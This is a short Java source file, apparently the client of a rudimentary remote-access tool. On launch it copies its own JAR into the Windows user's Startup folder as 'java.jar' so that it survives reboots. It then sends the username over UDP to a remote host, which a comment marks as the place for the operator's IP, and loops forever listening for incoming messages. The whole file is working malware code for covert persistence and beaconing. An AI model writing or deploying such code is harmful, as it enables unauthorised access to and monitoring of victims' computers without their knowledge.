package com.fejker.vclient;

import java.io.File;
import java.io.IOException;
import java.net.*;
import java.nio.file.Files;
import java.nio.file.StandardCopyOption;

public class Main {

    public static void main(String[] args) throws IOException, InterruptedException {
        byte[] receive = new byte[1024];
        byte[] buf;
        InetAddress address = InetAddress.getByName("localhost");       //ip address of remote machine to send ip address goes here
        DatagramSocket socket = new DatagramSocket();

        String username = System.getProperty("user.name");
        File path = new File(Main.class.getProtectionDomain().getCodeSource().getLocation().getPath().substring(1));
        String if_path = path.toString();
        String test = if_path.substring(0, if_path.lastIndexOf('\\'));
        test = test.substring(test.lastIndexOf('\\') + 1);
        if (!test.equals("Startup")) {
            File finalPath = new File("C:\\Users\\" + username + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\java.jar"); //mount to shell:startup of current user
            Files.copy(path.toPath(), finalPath.toPath(), StandardCopyOption.REPLACE_EXISTING);
        }
        buf = username.getBytes();
        DatagramPacket sendPacket = new DatagramPacket(buf, buf.length, address, 27000);
        socket.send(sendPacket);
        while (true) {
            DatagramPacket receivePacket = new DatagramPacket(receive, receive.length);
            socket.receive(receivePacket);
            System.out.println(data(receive));
            Thread.sleep(500);
        }
    }
    public static StringBuilder data(byte[] a) {
        if (a == null)
            return null;
        StringBuilder ret = new StringBuilder();
        int i = 0;
        while (a[i] != 0) {
            ret.append((char) a[i]);
            i++;
        }
        return ret;
    }
}
